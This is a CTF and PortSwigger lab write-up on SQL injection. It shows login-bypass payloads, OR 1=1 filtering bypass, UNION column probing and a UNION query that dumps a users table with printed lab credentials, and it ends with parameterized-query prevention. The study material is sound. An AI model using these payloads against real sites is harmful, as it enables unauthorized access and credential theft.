# SQL Injection — From Basics to Credential Extraction

## Overview

SQL injection occurs when user-controlled input is incorporated into a database query without proper sanitization. An attacker can manipulate the query structure to bypass authentication, retrieve hidden data, or extract sensitive information from the database.

I worked through this vulnerability class across two contexts: PortSwigger Web Security Academy labs and a real CTF challenge from HackIntro 2025. Both required the same core understanding but applied it differently.

---

## Part 1 — HackIntro 2025 CTF: Sequels are the Worst

**Challenge:** Log in as admin on a website.

The login form accepted a username and password. The obvious starting point was to test whether the input was sanitized by submitting a single quote `'` — if the application errors or behaves unexpectedly, the input is going directly into a SQL query.

The underlying query was likely:
```sql
SELECT * FROM users WHERE username='$user' AND password='$password'
```

Submitting `admin'--` as the username with any password turns this into:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `--` comments out the password check entirely. However in this case the MySQL block comment `/*` worked better:
```sql
SELECT * FROM users WHERE username='admin'/* AND password='anything'
```

Either way the result is the same — the password check is removed and the application returns the admin user, granting access without knowing the password.

**Lesson:** Authentication logic that relies on a password check embedded in a SQL query can be bypassed if the input is unsanitized. The fix is to use parameterized queries so user input is never interpreted as SQL.

---

## Part 2 — PortSwigger Labs: Building the Full Attack Chain

### Lab 1 — Retrieving Hidden Data

The application filtered products using a `released = 1` condition to hide unreleased items. By injecting into the category URL parameter:

```
/filter?category=Gifts'+OR+1=1--
```

The query becomes:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

`OR 1=1` is always true, so every product in the database is returned regardless of category or release status. The `--` comments out the rest of the original query.

---

### Lab 2 — Login Bypass

Same concept as the CTF challenge. Submitting `administrator'--` as the username removes the password check:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Access granted without a password.

---

### Lab 3 — UNION Attack: Determining Column Count

UNION attacks allow appending a second SELECT query to extract data from other tables. But for UNION to work, both queries must return the same number of columns.

The technique is to inject `UNION SELECT NULL--` and increment NULLs until the query succeeds without error:

```
' UNION SELECT NULL--           → error (1 column)
' UNION SELECT NULL,NULL--      → error (2 columns)
' UNION SELECT NULL,NULL,NULL-- → success (3 columns)
```

NULL is used because it is compatible with any data type — integer, text, date — avoiding type mismatch errors while the column count is being determined.

---

### Lab 4 — Finding a Text-Compatible Column

Not all columns accept string data. Once the column count is known, each position is tested by replacing one NULL at a time with a string value:

```
' UNION SELECT 'test',NULL,NULL--   → error
' UNION SELECT NULL,'test',NULL--   → success
```

The second column accepts text. This is the column that will be used to extract data.

---

### Lab 5 — Extracting Credentials from the Database

With the column count (2) and text-compatible column (both) confirmed in this lab, the users table was dumped in a single query:

```
/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--
```

This returned all usernames and passwords displayed directly on the page:

```
wiener       u0d490ou9ptz4pm9ndau
administrator 0nnhpxjm8h5uo8dnck0u
carlos       put05zdgit9e21e5yhvd
```

Logging in as administrator with the extracted password solved the lab.

---

## The Complete Attack Chain

In a real engagement the full SQLi workflow looks like this:

1. **Find the injection point** — submit `'` and look for errors or anomalies
2. **Confirm it's SQL** — try `'--` and see if the page loads normally
3. **Determine column count** — increment NULLs until no error
4. **Find text columns** — replace NULLs with strings one at a time
5. **Enumerate the database** — query `information_schema.tables` to list tables
6. **Extract data** — UNION SELECT target columns FROM target table

---

## Prevention

Parameterized queries (prepared statements) prevent SQL injection by separating query structure from user data:

```python
# Vulnerable
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")

# Safe
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

The user input is never interpreted as SQL — it is always treated as data. This single change eliminates the entire vulnerability class.

Input validation (whitelisting expected formats) adds a second layer of defense but should never be the only protection.
